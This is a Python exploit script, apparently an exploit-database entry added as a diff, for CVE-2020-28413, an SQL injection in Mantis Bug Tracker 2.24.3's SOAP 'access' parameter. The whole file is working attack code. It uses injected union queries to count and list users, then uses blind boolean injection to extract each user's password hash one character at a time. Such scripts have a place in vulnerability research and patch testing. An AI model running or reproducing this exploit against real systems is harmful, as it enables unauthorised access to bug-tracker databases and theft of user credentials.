@@ -1,0 +1,91 @@
+# Exploit Title: Mantis Bug Tracker 2.24.3 - 'access' SQL Injection
+# Date: 30/12/2020
+# Exploit Author: EthicalHCOP
+# Vendor Homepage: https://www.mantisbt.org/
+# Version: 2.24.3
+# CVE: CVE-2020-28413
+
+import requests, sys, time
+from lxml import etree
+
+proxies = {
+     "http": "http://127.0.0.1:8080",
+     "https": "http://127.0.0.1:8080",
+    }
+
+def Hacer_Peticion(query):
+    home = ""
+    url = home+"/api/soap/mantisconnect.php"
+    headers = {'content-type': 'text/xml',
+               'SOAPAction': url+'"/mc_project_get_users"'}
+    mantis_db_user = ""
+    mantis_db_pass = ""
+    body = """<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:man="http://futureware.biz/mantisconnect">
+       <soapenv:Header/>
+       <soapenv:Body>
+          <man:mc_project_get_users soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+             <username xsi:type="xsd:string">"""+mantis_db_user+"""</username>
+             <password xsi:type="xsd:string">"""+mantis_db_pass+"""</password>
+             <project_id xsi:type="xsd:integer">0</project_id>
+             <access xsi:type="xsd:string">"""+query+"""</access>
+          </man:mc_project_get_users>
+       </soapenv:Body>
+    </soapenv:Envelope>"""
+    response = requests.post(url, data=body, headers=headers, verify=False)
+    #response = requests.post(url, data=body, headers=headers, proxies=proxies, verify=False)
+    parser = etree.XMLParser(remove_blank_text=True)
+    xml = etree.XML(response.content, parser)
+    xml = etree.tostring(xml)
+    return(str(xml))
+
+def Cantidad_Usuarios_Mantis():
+    query = "0 union all select concat('-',(select count(*) " \
+            "from mantis_user_table),'0'),2,3,4 order by id asc limit 1"
+    xml = Hacer_Peticion(query)
+    txt = xml.split("integer")
+    txt = txt[1].split("id")
+    registros = str(str(str(txt[0])[:-2])[-2:])[:-1]
+    return(registros)
+
+def Obtener_Id(usr_pos):
+    query = "0 union all select concat((SELECT id FROM mantis_user_table " \
+            "order by id asc limit 0,1),'0'),2,3,4 limit "+str(usr_pos)+",1"
+    xml = Hacer_Peticion(query)
+    txt = xml.split("integer")
+    txt = txt[1].split("id")
+    id = str(str(txt[0])[:-2])[-1:]
+    name = str(str(txt[1])[29:]).split("</name>")[0]
+    return (id+"-"+name)
+
+def brute_force(data):
+    charts = "abcdefghijklmnopqrstuvwxyz0123456789"
+    passw = ""
+    id = data.split("-")[0]
+    name = data.split("-")[1]
+    for cp in range (1,33,1):
+        for c in charts:
+            print(f"\rHash: {passw}", end="")
+            time.sleep(0.00001)
+            sys.stdout.flush()
+            query = "0 union all select (select if(substring((select binary(password) " \
+                    "from mantis_user_table where id = " + str(id) + ")," + str(cp) + ",1)='" + str(c) + "','0','900000000000000000000')), 2,3,4 order by id asc limit 1"
+            xml = Hacer_Peticion(query)
+            txt = xml.split("integer")
+            txt = txt[1].split("id")
+            r_id = str(str(txt[0])[:-2])[-1:]
+            if(r_id=="0"):
+                passw = passw + str(c)
+                break
+    print(f"\r", end="")
+    sys.stdout.flush()
+    print(name+": "+passw)
+
+def main():
+    cantidad_users = Cantidad_Usuarios_Mantis()
+    print("Cantidad usuarios en db: "+str(cantidad_users))
+    print("Obteniendo Hashes...")
+    for x in range(0,int(cantidad_users),1):
+        brute_force(Obtener_Id(x))
+
+if __name__ == "__main__":
+    main()
